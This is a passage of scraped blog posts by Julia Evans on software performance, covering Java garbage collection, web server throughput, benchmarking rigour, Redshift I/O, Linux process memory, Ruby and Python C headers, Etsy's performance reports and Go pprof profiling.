file in Java would create several separate objects which referred to each other (a buffered reader which points to the file object…). My impression is, “modern” Java libraries too often create even larger object chains for a single task. This can add to the GC pressure. \n \n\n Of course, all these practices can be used equally well to bring down a program with manual allocation to a crawl. So in summary I am a strong proponent of GC, but one needs to be aware of at least the performance tradeoffs different factorings of one program can bring. Modern GCs are incredibly fast, but that is not a magic property. \n \n\n A few more tidbits: \n\n \n apparently there’s a pauseless garbage collector you can pay for called Zing \n there’s also an open source pauseless garbage collector called  Shenandoah ,  homepage? . I saw a talk about it at strange loop 2014 and it’s not clear what the state of it is. \n Several people pointed out that you can use different garbage collectors in Java (the G1 collector! the parallel collector!) and it seems like experimenting with choices of garbage collectors is definitely a pro move. \n \n\n"},
{"url": "https://jvns.ca/blog/2016/02/10/have-high-expectations-for-computers/", "title": "Have high expectations for your computers", "content": "\n     \n\n I gave a talk at  CUSEC  (a conference for software engineering students) in January where I talked about performance. One of the points I wanted to make in that talk was –  computers are fast , and you should have high expectations for how fast they can be. \n\n When I was in undergrad I didn’t know  anything  about how fast a computer or a disk was. I was awesome at algorithms but I probably would have believed you if you told me it was impossible to do more than a million square roots in a second. \n\n Now I know a little more, and I have higher expectations, and it’s been really useful to me! For instance: if you have a machine that’s crawling and unable to do more than 10 requests per second? You should probably expect more. Let me try to convince you of that, and we’ll start high. \n\n a million QPS \n\n What if you wanted to handle a million requests per second (aka QPS) on your computer? \n\n First, that’s totally possible. I was originally alerted to this possibility by the amazing  Kelly Sommers  and her Haywire web server. As I understand it, it was originally a toy project for her to experiment with writing high-performance C code. According to  its README , Haywire can process  9 million  HTTP requests per second. \n\n When I first read that I thought it was a typo. Surely nothing can do a million anythings per second? It wasn’t a typo. \n\n But Haywire is a toy project, right? If we’re talking about doing a million requests per second, we should talk about a real project that people use in production. Great! Let’s talk about  nginx . \n\n There’s a great blog post by Datacratic, a little ad tech company here in Montreal, called  1M QPS with nginx and Ubuntu 12.04 on EC2 . They say it was pretty easy to reach 500K QPS, and then they did some extra tuning to get to a million. Welp. \n\n Java: 50,000 QPS \n\n Okay, let’s add an extra couple of layers of difficulty. First, let’s use a Java server, which we’d expect to be maybe a little slower, and secondly, let’s have our service actually do something nontrivial. For this I visited  Netty’s testimonials page \n\n That page says: \n\n \n During our lab testing, the library has displayed excellent performance characteristics, allowing us to service 50,000+ messages per second from approximately 30,000 connected clients on a commodity Intel server costing approximately $850 \n \n\n 50,000 QPS on a single server is still not shabby. I wish I had that! I imagine you could probably serve hundreds of thousands of requests per second in Java if you did practically nothing and were really careful about your memory usage. (if nginx can do it, why not netty? is there a reason?) But I’m making that up – I’m not a Java performance wizard (yet). \n\n Python, 1,000 QPS \n\n Okay, Python is slow, right? Way slower than Java. I’m going to get into way sketchier territory here – we’ve resorted to a  tumblr post benchmarking a toy Python server against Go \n\n I tested this one on my laptop. You can really do 1,000 HTTP requests per second in a toy Python HTTP server! Neat. \n\n Reasons your webserver might be slow \n\n Okay! We’re now in charge of performance at an Important Web Startup. Let’s say you want to serve 500 requests per second on a single server. I’m talking about throughput here – I’m supposing it’s okay if it takes a long time to serve each request, you just need to finish 500 every second. \n\n First:  your CPU can slow you down \n\n Let’s say you have 4 cores, and you want to serve 500 requests per second (throughput). Then your CPU budget per request is 8 milliseconds. That’s just CPU budget – if you’re waiting for a database, that doesn’t count. \n\n I’m finding CPU budgets real useful to think about right now because I just found out that my service that I thought was slowed down by its network/database latency was ACTUALLY BEING SLOWED DOWN BY UNNECESSARY CPU ACTIVITY. I was mad. \n\n So, 8 milliseconds. We already know that  a millisecond is a really long time in Java . It’s a million CPU instructions! But honestly – even if you’re in Python, 8 milliseconds is kind of a long time! If you have a webserver where the requests take more than 8ms of CPU time, it might be worth understanding why! It was super worth it for me to understand this. \n\n Second,  you can have worker starvation \n\n I hate worker starvation. It is the worst. Worker starvation is when you have, say, 100 workers that can work on requests, and they’re all busy. Then when the 101st request that second comes in, it has to wait! Even if you have extra CPU to spare! This SUCKS. \n\n I’m not going to pretend I know the answer to how to fix this for everyone. It sucks though. Maybe you can add more workers! Maybe you can do more work asynchronously! Maybe you can use threading! This stuff isn’t easy but sometimes you can make progress. \n\n Third,  you can saturate your network connection \n\n If you have a web service, that means you need to receive network requests and send responses! If you run out of network bandwidth (perhaps because you’re doing huge database queries?), you can’t do any more! You either need a new machine, or more bandwidth, or figure out how to make your damn requests smaller. Sorry. \n\n Amazon EC2 has relatively inexpensive machines that do  1Gbps  of network activity, according to this  random blog post . I don’t have a lot to say about that, but that seems like a lot of network to me. \n\n Fourth,  your database might not be able to handle the load \n\n You can’t fix this by adding more machines! Here you need to put your database on a bigger computer or replicate it or run less expensive queries or something. \n\n Fifth,  you only have so much disk I/O \n\n If you can read from your disk at 200MB/s – that’s it. You can’t read more. This is like the network saturation problem. No good! \n\n There are a lot more things that can go wrong \n\n I stopped at 5, but there’s a lot of reasons your server can be slow! I’ve probably missed a bajillion things. There are a lot of resources that you can be stuck waiting for (like other external services!). You could have a problem with locks! You can’t know until you investigate. \n\n understand why your webserver can’t do a million QPS \n\n I’m kind of joking here, but kind of not! Suppose your server gets super sad when you throw more than 10 requests per second at it. Why can’t it do 10 times that? \n\n some possible responses: \n\n \n it’s because it’s in Python! (are you really doing more than 100ms of CPU per request? that’s a lot! why is that happening?) \n it’s because of the database! (cool! databases are really fast though! can you get a list of the most expensive queries and understand why those are happening?) \n I need to read a lot from disk and I have no more disk bandwidth. (do you know for sure why you’re reading so much?) \n it’s because of my network connection! (maybe just run  dstat  to make sure your network activity is what you think it is? You can break it down by process!) \n \n\n I’ve found that it’s really easy to be wrong about why something is slow. Taking an hour or a day to look closely and make sure my assumptions about why my server is slow has been an awesome use of time. Spending a day setting up profiling feels terrible but then is AWESOME when you make everything faster and everybody loves you. \n\n believing in my computers is really useful to me \n\n I have this mission to develop an absolute sense of how fast computers are. Instead of “Go is faster than Python”, I want to be able to know things like “I should be able to easily do 100 QPS in Python”. \n\n Sometimes I tell someone about a programming problem I solved in a millisecond, and they say “I can solve it in a microsecond!”. As long as they’re not a jerk, I actually find this totally delightful – if computers can do a thing 1000 times faster than I thought, that’s amazing! I can add it to my list of magical computer facts. \n\n Raising my expectations about how fast computers can and should be has been super useful to me. Now when I see that it takes a hour to process a million records, I get mad. If an HTTP request takes 100ms of CPU time to process, I get mad. I try to restrict my anger to cases where it actually matters – if the processing job is in my way, or if web performance is actually a problem. \n\n But when performance becomes a problem, I find my slowly-building intuitions about performance are incredibly useful. I can feel way more confident spending time profiling and optimizing the problem if I’m sure that the program can be faster. And so far it’s worked! I’ve been able to make a couple of things much much faster. \n\n Maybe there will be more interesting optimizations in my future! Maybe having high expectations about computers will be useful to you too! A toast to fast programs :) \n\n"},
{"url": "https://jvns.ca/blog/2016/07/23/rigorous-benchmarking-in-reasonable-time/", "title": "Benchmarking correctly is hard (and techniques for doing it better)", "content": "\n     \n\n This post is about the paper  Rigorous benchmarking in reasonable time . \n\n A few months ago  Julian  told me about a paper called  Printing Floating-Point Numbers: A Faster, Always Correct Method . There are two really remarkable-to-me things about this paper. \n\n First: I didn’t know that printing floating point numbers was a research problem! The core problem is that – there are a finite amount of 64 bit floating point numbers (about 2^64 of them!). So for any number, there are one or two closest floating point numbers to that number. 0.21 and 0.21000000000000002 are very close! So close that there’s no floating point number between them. You can see this in Python: \n\n >>> print 0.21\n0.21\n>>> print  0.21000000000000002\n0.21\n \n\n This isn’t a mistake on Python’s part; this is just how floating point works. This means that printing a floating point number is nontrivial – in principle it’s not incorrect to render  0.21  as  0.21000000000000002 , but probably you want to print the shortest version of the number. So this paper talks about how to do that correctly. I love learning about programming problems (that are solved on my computer every day, when serializing numbers into JSON!) that I didn’t even know existed. \n\n The second interesting thing in this paper is – the original result said they had an algorithm to print floating point numbers which was \n\n \n always correct (as short as possible) \n ran 2x faster than the fastest known (approximate) algorithm \n \n\n This turned out to be wrong – it was actually 2x  slower  than the approximate algorithm (it’s still an improvement on the state of the art in exact algorithms). They talk about what happened in  their README . \n\n I don’t point this out to make fun of the researchers for coming up with an incorrect result. I’m pretty sure they’re way better at performance analysis than I am. Instead, I think this is a really good illustration that benchmarking programs and figuring out which one is faster is really hard – much much harder than you might think. \n\n rigorous benchmarking in reasonable time \n\n Okay, now to the actual point of this blog post. Julian also handed me a paper the other day called  Rigorous benchmarking in reasonable time . \n\n In this the paper, they start out by saying \n\n \n many performance results are small improvements (5-10%) – of those they surveyed, the median improvement advertised was 10% \n a 10% improvement is well within the bounds of error on a lot of experiments \n so you need confidence intervals around your benchmarks! \n but more than half of papers that talk about performance don’t publish confidence intervals \n \n\n I’m less interested in the question of academic rigor here and more interested in the idea of benchmarking correctly in practice – I’d like to make programs faster, and a great way to make your stuff WAY FASTER is to make many small 5% improvements. So you need to actually be able to detect a 5% improvement. \n\n independence \n\n The first idea they talk about, which was new to me, was the idea that if you run a benchmark many times, it is important whether or not the run times converge to a sequence of iid samples. That is kind of mathy, so here are a couple of images illustrating what I think it means: \n\n \n\n In the first one, at first everything is slow. Maybe the code is in Java, and the JIT hadn’t kicked in yet. But then the samples speed up, everything stabilizes, and you’re golden. You can probably meaningfully average them after that point (but remember to throw away the samples at the beginning!!). \n\n In the second example, there’s this weird periodic pattern: the program is slow, then fast, then slow. You might think this is unlikely, but in the paper they talk about two benchmarks they ran – one got faster every time they ran it (for 200 iterations), and one got slower every time they ran it. \n\n They say it’s not the end of the world if you have a situation like the second example – it happens! But you do need to be aware of it. They have specific recommendations for what to do in all these cases (read the paper to find out what they are!) \n\n I found this really interesting because graphing the speed of a benchmark over time is certainly something I’ve never done (usually I just blindly take an average or something). Now I’m much more motivated to do it. \n\n technique for checking independence: randomly shuffle \n\n There are a lot of techniques for figuring out if a bunch of samples are independent. You can calculate a bunch of autocorrelation numbers and do mathy stuff. But! I really love statistical smoke tests where you can look at something visually and say “uh, no, that’s definitely broken”. They gave a really nice smoke test in this paper. \n\n The idea is – if you have a series of benchmarks over time (like the periodic one I drew above), and then you randomly shuffle all of the benchmarks, does the randomly shuffled one look basically the same as the original? if not (like if the original was monotonically decreasing one, and the shuffled one isn’t), then it’s not independent! \n\n benchmarking is hard. understanding your data is good. \n\n I know that for Java there’s a benchmarking framework called  JMH  which is well regarded and solves a bunch of common benchmarking problems for you. I found this paper interesting because it didn’t advocate using a Smart Benchmarking Framework which Solves All the Problems For You, and instead explains how you can understand the properties of the code that you’re benchmarking and design a statistical analysis appropriately. I don’t know which is better! \n\n But as a person who’s done a lot of data analysis, the idea that you should look at the data that you’re using to make an important decision (more than just calculating a single point estimate of the median / average) seems extremely reasonable to me. \n\n  Thanks for Julian Squires for the papers.  \n\n"},
{"url": "https://jvns.ca/blog/2016/03/23/io-matters/", "title": "I/O matters.", "content": "\n     \n\n Here’s another missive from the series “what Julia learned today at work”. \n\n Today I was running a Redshift query, and it was slow. Redshift is this database-as-a-service from Amazon and so far my experience with it is that it is MAGICAL and AMAZING. You can do huge joins & aggregations between huge tables and it’s fast and it works. \n\n But not this query! This query was slow. I’d been querying this table, for months and it had been slow for months. Finally I was like “well, there has to be a reason why it’s slow”. I asked my awesome coworker Jeff what was up. \n\n Now, Redshift is a columnar database (unlike sqlite/mysql/postgres). This means that it stores the data from each column together on disk, so if you have a 900GB table, but the column you want is only 1GB of data, then you only need to read 1GB. This is amazing when you have wide tables that you only want to query a few columns from, which is the situation I’m in most of the time. \n\n So, back to my table. I was querying a string column. That string column, on disk, was taking up ~100GB of space. This means that every time I queried, it had to read 100GB from disk (modulo disk caches). That’s a lot! Jeff turned on compression and told Redshift that the column was a  varchar(255)  instead of a  varchar(65536) . My queries got way faster. \n\n i/o doesn’t go away because you’re in The Cloud \n\n With these Magical Cloud Services it can sometimes be hard to remember that your data is just living on real computers somewhere, with real disks, and you’re still bound by the normal limits of I/O. Having less data on disk will mean you have to do less I/O, and make your queries faster! That’s how disks work =D \n\n This is one of these super obvious things (of  course  Magical Cloud Things are just computers and are bound by the normal laws of computers!), but I’m happy every time I’m reminded of it. \n\n"},
{"url": "https://jvns.ca/blog/2016/12/03/how-much-memory-is-my-process-using-/", "title": "How much memory is my process using?", "content": "\n     \n\n I often want to know how much memory my processes are using. When I run\n top , I see this: \n\n \n\n For years I’ve been reading explanations of the VIRT, RSS, and SHARED\ncolumns and for years I’ve been like “ugh, why is this so complicated,\nwhy can’t I just know how much memory my process is using, this is\nsilly. \n\n Today I read the super-helpful article  htop explained ,\nand together with learning a little bit more about how virtual memory\nworks on Linux, I think I understand what’s going on! \n\n The short version is “the way memory works on Linux is just\nfundamentally more complicated than ‘process Y is using memory X, so\nasking ‘how much memory is my process using’ can only ever have\napproximate answers’ \n\n For all this to make sense, first we need to understand how virtual\nmemory works and we’re going to learn what a “page table” is. \n\n virtual memory & the page table \n\n You have RAM in your computer (i have touched mine with my hands!). That\nRAM has addresses, and data lives at addresses in RAM. \n\n When you access memory in your program (like “0x39242345”), those\naddresses are not physical RAM addresses. They’re “virtual” memory\naddresses, that are specific to your process. I wrote a comic about how\nthis works: \n\n \n \n \n \n \n\n Here’s a text version of that comic: \n\n \n every process has its own memory space (so  0x39242000  might point to\n“dog” in one process and “cat” in another process) \n The virtual memory addresses like  0x39242000  map to physical RAM\naddresses, and diferent processes have different mappings \n The mapping of virtual -> physical addresses is different for each\nprocess! The mapping is generally done one 4 kilobyte block at a time \n The virtual -> physical addresses map is called the  page table \n \n\n I’d heard about the page table before, but one thing that was really\nconfusing to me until yesterday was – how do these lookups of virtual\naddresses happen, exactly? Wouldn’t doing a lookup in a table every\nsingle time you access memory be really slow? \n\n The answer is that your CPU itself does the lookups in the page table!\nIt knows which part of physical RAM the mapping for your process lives\nin, and then every time it executes an instruction that accesses memory,\nit looks up which real physical memory it needs for that instruction in\nRAM. \n\n When you switch processes, the kernel updates the address of the page\ntable so that the CPU knows where to look. \n\n side note: page tables & caches \n\n You might be thinking “wow, does that mean that every time I do a memory\naccess I actually have to do  two  memory accesses”? And you would be\nright! It  is  kind of expensive to do that. \n\n Your CPU helps make this faster by caching page table lookups in the\n translation lookaside buffer (TLB) .\nThis is a super fast cache and if your virtual memory address is in the\nTLB then you just need to do 1 memory access to access memory instead\nof 2. \n\n I think if you access your memory in a predictable way (like access a\nbunch of memory all at once, your CPU can do smart optimizations like\n“huh, I’m going to need to look up that address in the page table next,\nI will preload it into the TLB”).  This is because modern CPUs are not\nactually linear things, but do all kinds of operations at the same time. \n\n At this point we’re deeper in hardware optimizations than we need to be\nfor the purposes for this blog post, and besides I’ve already probably\nsaid something wrong about how hardware works, so let’s go back to\ndiscussing how much memory our processes are using :). \n\n shared memory \n\n Now that we understand how memory accesses work on Linux, we can talk\nabout the first complicated thing:  shared memory . Here is a comic\nabout copy on write. \n\n \n \n \n \n \n\n So, this is weird! This means that 2 processes can be using  exactly\nthe same physical memory . And worse, that shared memory could be\nscattered in totally random places through the process (so you could\nhave 4MB of non-shared memory, then 8MB of shared memory, then more\nunshared memory, etc.) \n\n There’s no clean way to logically split up shared and non-shared memory.\nBasically any 4 kilobyte page could be shared or not shared. This is\ngreat for performance (less copying!) and reducing memory usage, but\nmakes it hard. \n\n So I could be running 16 Google Chrome processes, and you could have \n\n \n some memory that all of them share (C libraries) \n some memory that only a few of them share \n some memory that is shared for a while, and then slowly becomes\nunshared over time \n \n\n You could imagine counting every single page of memory, saying “okay,\nthat page is shared by 6 processes, I will divide it by 6 and\nattribute that amount to my process”. This seems like a resaonable way\nto count memory to me. It turns out that you can actually do this\nsomehow via  /proc/$PID/smaps  and the PSS column but I have not\ninvestigated this yet and it is not how  top  reports memory use. \n\n swap and mmap \n\n The next (and, I think, last) reason counting memory is complicated is\nthat not all virtual memory actually maps to physical memory. \n\n You might have heard of swap!! \n\n In your page table, instead of a virtual memory address being mapped to\na physical address, you can map it to “EMERGENCY ASK THE OPERATING\nSYSTEM FOR HELP”. (basically null or something). When the CPU comes across this, it’ll be like “what\nthe hell is this, operating system, please fix it”. (the technical term\nis a “page fault”) \n\n At this point the operating system could in principle do whatever it wants, but usually\nthe reason this is happening is that that virtual memory address is\n actually some data on disk . So the operating system will go read the\ndata from disk, put it into physical memory, and then the CPU will go\nmerrily on its way and keep running your code. \n\n There are two normal reasons you might have memory addresses that\nactually map to the disk: \n\n \n swap : your operating system actually ran out of physical memory so\nit put a bunch of data from RAM on disk \n a program asked your operating system to do it with  mmap .\nBasically if you want to read a 1GB file, you can say “hey, please map\nthis file into memory, and just load it lazily when i access that\nmemory”. This can have better performance than reading the file\nnormally, and it’s a very common pattern. \n \n\n how much memory is my program using? \n\n Okay, we know about a bajillion things about how memory works on\nLinux now! Let’s go back to what we saw in top. \n\n \n\n “VIRT”  means “this is how much virtual address space this program has”.\nThis could be mmaped files, and all kinds of stuff that does not\nactually live in physical memory at all. This number is not really that\nuseful if you want to know how much RAM you’re using. \n\n RSS  (resident set size) is much closer to your normal notion of “how much memory I am\nusing” – it’s the amount of actual physical RAM that is used by that\nprocess in some way. For example, in the table above  compiz  is using\n1.6GB of virtual memory but only 270MB of actual real RAM. \n\n SHR  is the amount of physical RAM for that process that is shared\nwith other processes. I think you have no way of knowing how many other\nprograms that RAM is shared with, or if it’s likely to continue being\nshared in the future (like if it’s copy-on-write shared memory). We can\nsee that half of Google Chrome’s memory is shared with other\nprocesses (probably other Chrome processes). \n\n %MEM  is the percentage of physical RAM that the process is using. so\nit’s RSS divided by total physical memory. \n\n i feel way better \n\n I’ve been confused about this for years so it feels nice to\nactually understand what these numbers mean and why there are so many of\nthem and why it’s so confusing. It turns out that virtual memory systems\nare kinda complicated, but that if I understand the basics it helps to\nclear up a lot of confusion! Awesome. \n\n"},
{"url": "https://jvns.ca/blog/2016/04/22/java-garbage-collection-can-be-really-slow/", "title": "Java garbage collection can be really slow", "content": "\n     \n\n Yes, friends, I know this is news to absolutely nobody. But today I had up-close-and-personal problems with Java garbage collection for the first time so I am going to tell you about it. \n\n So! I was running a program. I set the Java memory limit to 4 gigabytes ( -Xmx4G ). I ran it on a file with one million lines. Done. no problem. Next: 8 million lines. It took… well.. more than 8 times longer. Way longer. Then it crashed with an out of memory error. \n\n I was fine with it crashing (if you’re out of memory, you’re out of memory! I get it!) But why did it take so long to run? I asked  Erik  for some help, because he is the best and knows a lot about Java performance. \n\n He suggested this JVM flag:  -XX:+PrintGCDetails . This is my new favorite JVM flag. \n\n I started the program. It started out by printing out some stuff like this: \n\n [GC\n    [PSYoungGen: 142816K->10752K(142848K)] 246648K->243136K(375296K),\n    0,0935090 secs\n]\n[Times: user=0,55 sys=0,10, real=0,09 secs]\n \n\n These are “young gen” collections. I still don’t totally understand how the young gen collections work. I know that they only collect new objects, and use a different algorithm from full collections. The most important thing to know is that young gen collections are fast. mine were taking 0.09 seconds and freeing many many megabytes of memory. Maybe a gigabyte? Fast. \n\n Then, things got bad. The program slowed wayyyy down. It would do 0.2 seconds of work, and then some thing like: \n\n [Full GC\n    [PSYoungGen: 10752K->9707K(142848K)]\n    [ParOldGen: 232384K->232244K(485888K)] 243136K->241951K(628736K)\n    [PSPermGen: 3162K->3161K(21504K)],\n    1,5265450 secs\n]\n[Times: user=10,96 sys=0,06, real=1,53 secs]\n \n\n \n me: PROGRAM. You can’t just stop for 1.5 seconds after working for 0.2 seconds! That makes no sense \n program: uh, yeah i can. \n \n\n These are full collections that do mark-and-sweep over every object in memory and make sure we collect everything we can. Everything. This can be very very slow (2 seconds is a very long time to stop!). \n\n I thought this was really interesting and surprising. I knew GC was important but did not know that it could bring a program to a screeching halt. But apparently it can! \n\n The many objects in the old generation were still used every time it collected, so it had to constantly iterate over those objects and ask “can I free you yet?” “nope.” “can I free you yet?” “nope.” “can I free you yet?” “nope.”. \n\n memory pressure \n\n Now I think I understand what memory pressure is on the JVM! If your application is using 3.5GB of memory normally, and has a limit of 4G, then it may constantly need to garbage collect and slow your program waaaaaay down. If you had a memory limit of 20GB, that same program (using the same amount of memory) would be able to run faster because it wouldn’t need to constantly try to garbage collect the same objects all the time. \n\n So this was bad. I do not have a story of redemption for you here yet (Presumably we can make it better by looking at what the objects are and using less objects. Did you know that you can get a histogram of which kinds of objects are taking up all the space with  jmap -histo $pid ? It’s the best.) \n\n But it was interesting! Now we know that garbage collection can ruin your program’s day, what memory pressure is, and that memory pressure is bad. \n\n I read this article about  garbage collection  that I don’t fully understand by Martin Thompson that concludes with \n\n \n GC tuning can become a highly skilled exercise that often requires application changes to reduce object allocation rates or object lifetimes. \n \n\n which is to say “sometimes the only way is to make your program stop allocating so much memory” \n\n"},
{"url": "https://jvns.ca/blog/2017/12/20/how-are-ruby-s-headers-different-from-python-s-headers-/", "title": "How are Ruby's headers different from Python's headers?", "content": "\n     \n\n This is another research-y post, most things in here I learned in the last 24 hours so likely some\nof it is wrong. \n\n Today and yesterday I’ve been trying to figure out how the public header files Ruby exposes are\ndifferent from the header files Python exposes (how are their public C APIs different?). You can get\nthese headers in the libruby-dev / libpython-dev Debian packages. These header files live in\n/usr/include/{ruby-2.3.0|python-VERSION} on my laptop, and they’re one of the interfaces that\nPython/Ruby provide that I don’t usually think about that much. These header files are what you use\nwhen you’re writing a C extension for the language (like numpy) or embedding the language. \n\n My stake in this is that I’m trying to do for Ruby essentially what  pyflame  does for Python, so understanding how Ruby is different from Python is very useful to me. pyflame uses Python’s public headers. Can my profiler use the corresponding Ruby headers? I don’t think so! \n\n A reason these are important is that there’s an expectation that they be somewhat stable – obviously they change from version to version sometimes, but they need to be more stable than Python/Ruby’s internal header files. The  structs I was talking about yesterday  are all  internal  Ruby VM structs, so they change a lot. \n\n Python is embeddable \n\n One fact that I learned yesterday is – you can embed Python in your C programs! Here are the  docs on embedding Python . Some examples of programs that embed Python include Sublime Text, Maya, Blender, Inkscape, Nuke – a lot of graphics / 3D modelling programs. There are more listed at on  Python’s Wikipedia page . \n\n I also found this  argument/rant from Glyph that you shouldn’t embed Python  interesting reading. \n\n Ruby is embeddable \n\n There isn’t any documentation on  http://ruby-lang.org   (that I can find) about embedding Ruby. But when I said on twitter that ruby wasn’t embeddable, Matz replied and said “CRuby is also embeddable. But mruby has better API for embedding.” Obviously he’s right that CRuby is embeddable, so let’s find out what’s up! \n\n First –  https://github.com/mruby/mruby  is a lightweight implementation of Ruby intended for embedding. The README says that the syntax is Ruby 1.9 compatible. Neat! \n\n But what about CRuby being embeddable? Let’s investigate that. The first point of documentation is  doc/extension.rdoc  in the Ruby repo (previously called README.ext). The most useful docs I found was  the Pragmatic Programmer chapter “Extending Ruby” . \n\n mruby seems to be more popular for embedding than CRuby but at least one popular program embeds\nCRuby/MRI:  RPG Maker ! (thanks to  Florian  for pointing this out) \n\n Cool example of embedding Ruby: filtering syscalls! \n\n Quick tangent: this slide deck on  hijacking syscalls with Ruby  from Franck Verrot is really interesting! Basically it describes a way to make sure that your programs are only running ‘allowed’ system calls. Here’s how it works as far as I can tell: \n\n Create a .so library that uses embedded ruby to load a ‘policy.rb’ file that dynamically filters / logs system calls\nAdd that library to your LD_LIBRARY_PATH for the programs you want to check \n\n The slide deck says that this was reasonably efficient. \n\n Anyway, this is not about cool ways to embed Ruby. Let’s move on. \n\n Ruby bindings: Everything is a VALUE \n\n One surprising/interesting thing to me about the Ruby headers – the type returned by almost every function is  VALUE . The equivalent to that for Python seems to be  PyObject  but there are more types than PyObject in there. And PyObject has a  struct definition , whereas VALUE is an opaque pointer ( typedef uintptr_t VALUE; ). \n\n To get an idea of what “everything returns  VALUE ” looks like in practice, here are the functions you can use to define classes in Ruby: \n\n VALUE  rb_define_class(char *name, VALUE superclass\")\n   Defines a new class at the top level with the given name and superclass (for class Object, use rb_cObject). \nVALUE  rb_define_module(char *name\")\n   Defines a new module at the top level with the given name. \nVALUE  rb_define_class_under(VALUE under, char *name, VALUE superclass\")\n   Defines a nested class under the class or module under. \nVALUE  rb_define_module_under(VALUE under, char *name\")\n   Defines a nested module under the class or module under. \nvoid  rb_include_module(VALUE parent, VALUE module\")\n   Includes the given module into the class or module parent. \nvoid  rb_extend_object(VALUE obj, VALUE module\")\n   Extends obj with module. \nVALUE  rb_require(const char *name\")\n   Equivalent to ``require name.'' Returns Qtrue or Qfalse. \n \n\n Structs Ruby and Python expose in their bindings \n\n Let’s talk about structs! In the public header files Ruby and Python export (which live in the libruby-dev / libpython-dev packages in Debian), there are struct definitions. How are those different? I found it useful to just list all the structs they export. Here’s the list! \n\n Ruby 2.3.0:   RArray ,  RBasic ,  RClass ,  RComplex ,  RData ,  RFile ,  RMatch ,  RObject ,  RRegexp ,  RString ,  RStruct ,  RTyped . \n\n Python 3.5:  PyAddrPair ,  PyASCIIObject ,  PyAsyncMethods ,  PyBaseExceptionObject ,  PyBufferProcs ,  PyByteArrayObject ,  PyBytesObject ,  PyCellObject ,  PyCFunctionObject ,  PyCodeObject ,  PyCompactUnicodeObject ,  PyCompilerFlags ,  PyComplexObject ,  PyCoroObject ,  PyCursesWindowObject ,  PyDateTime ,  PyDescrObject ,  PyDictObject ,  PyFloatObject ,  PyFrameObject ,  PyFunctionObject ,  PyFutureFeatures ,  PyGC ,  PyGenObject ,  PyGetSetDef ,  PyGetSetDescrObject ,  PyHash ,  PyHeapTypeObject ,  PyImportErrorObject ,  PyInstanceMethodObject ,  PyInterpreterState ,  PyListObject ,  PyLockStatus ,  PyMappingMethods ,  PyMemAllocatorDomain ,  PyMemAllocatorEx ,  PyMemberDef ,  PyMemberDescrObject ,  PyMemoryViewObject ,  PyMethodDescrObject ,  PyMethodObject ,  PyModuleDef ,  PyNumberMethods ,  PyObject ,  PyObjectArenaAllocator ,  PyOSErrorObject ,  PySequenceMethods ,  PySetObject ,  PySliceObject ,  PySTEntryObject ,  PyStopIterationObject ,  PyStructSequence ,  PySyntaxErrorObject ,  PySystemExitObject ,  PyThreadState ,  PyTracebackObject ,  PyTryBlock ,  PyTupleObject ,  PyType ,  PyTypeObject ,  PyUnicodeErrorObject ,  PyUnicodeObject ,  PyVarObject ,  PyWrapperDescrObject \n\n Python gives you a lot more structs than Ruby, and those structs in general I think have more fields. The structs I want access to are like  PyThreadState , and they’re not in Ruby’s public header files. \n\n What interfaces does Ruby’s C API provide for getting stack traces? \n\n An API for getting stack frames was added to Ruby in commit\n 774bff0adb  on\nOctober 7, 2013 – the main function here seems to be  rb_profile_frames . This is a  function \nthough so to call it you need to be in the same Ruby process, not in a separate process. \n\n I went to look at the  stackprof  profiler and its initial commit is from\n October 10, 2013  – 3 days after the new profiler feature was released. Makes sense! \n\n Here’s what stackprof’s initial release notes say: \n\n samples are taken using a combination of two new C-APIs in ruby 2.1: \n\n \n signal handlers enqueue a sampling job using  rb_postponed_job_register_one .\nthis ensures callstack samples can be taken safely, in case the VM is garbage collecting\nor in some other inconsistent state during the interruption. \n stack frames are collected via  rb_profile_frames , which provides low-overhead C-API access\nto the VM’s call stack. no object allocations occur in this path, allowing stackprof to collect\ncallstacks for in allocation mode. \n \n\n that’s all for now \n\n There are probably more important differences between Ruby’s header files and Python’s header files\nthat I don’t know about yet. That’s enough blogging for today though! \n\n"},
{"url": "https://jvns.ca/blog/2016/05/01/the-etsy-site-performance-report/", "title": "The Etsy site performance report is amazing", "content": "\n      This is gonna be quick – I just found out yesterday that the Etsy developer blog ( code as craft ) publishes a  site performance report  every quarter. \n\n I love this for so many reasons – it’s a public commitment to having good site performance ( and seth walker from Etsy has a talk about that! ), it’s regular and constantly changing, they have GRAPHS, they explain what internal changes caused that 25ms drop, and they talk in depth about their measurement tools and what the advantages & disadvantages are of each one. I’m definitely going to be coming back to this frequently. \n\n It covers both backend and frontend performance. If you’re interested in web performance, you should look at Lara Hogan’s talks & book  “Designing for Performance”  on frontend performance. (if you look carefully, you’ll notice that a lot of those Etsy site performance reports are written by her). \n\n I also found some slides  Web Performance and Tools at Etsy  by Mike Brittain that are great. \n\n I couldn’t find an index of the older posts so I made one myself for my own reference. Here’s everything I could find: \n\n \n 2014 and later \n december 2013 \n september 2013 \n june 2013 \n march 2013 \n october 2012 \n june 2012 \n march 2012 \n november 2011 \n august 2011 \n launch post for the performance report \n \n\n I would love to make a performance report like this at work. \n\n One other tiny thing I love about this – the 2014-2015 reports are all (with the exception of one) written by women. I asked someone about this and they were like “yeah that’s because the Etsy performance team is mostly women!”. And Lara Hogan from before is Senior Engineering Manager of Performance and Infrastructure Chief of Staff. \n\n Of course having majority-women teams and teams led by women is a totally normal & reasonable thing but it made me happy to see. While we’re talking about things by people I admire who work at Etsy I’m going to link you to  Ryn Daniels ’ incredible post  On Showing up to the Table . They also have a book coming out called  Effective DevOps ! \n\n"},
{"url": "https://jvns.ca/blog/2017/09/24/profiling-go-with-pprof/", "title": "Profiling Go programs with pprof", "content": "\n     \n\n Last week me and my cool coworker Josh were debugging some memory problems in a Go program using  pprof . \n\n There’s a bunch of pprof documentation on the internet but I found a few things confusing so here\nare some notes so I can find them easily. \n\n First – when working with pprof it’s good to be running a recent version of Go! For example Go 1.8\nadds  mutex profiles  so you can see mutex contention. \n\n in this post I’ll \n\n \n link to the useful pprof resource I found \n explain what a pprof profile is \n give an example of how to look at a heap profile of a Go program \n explain a few things about the heap profiler works (what do the stack traces mean? how are they collected?) \n most importantly (to me), deconstruct an example pprof protobuf file so we understand what a pprof profile\nactually is \n \n\n This post won’t really explain in detail how to use pprof to diagnose performance issues in Go\nprograms, but I think these fundamentals (“what even is a pprof file”) will help me do that more\neasily. \n\n pprof basics \n\n pprof lets you collect CPU profiles, traces, and heap profiles for your Go programs. The normal way\nto use pprof seems to be: \n\n \n Set up a webserver for getting Go profiles (with  import _ \"net/http/pprof\" ) \n Run  curl localhost:$PORT/debug/pprof/$PROFILE_TYPE  to save a profile \n Use  go tool pprof  to analyze said profile \n \n\n You can also generate pprof profiles in your code using the  pprof  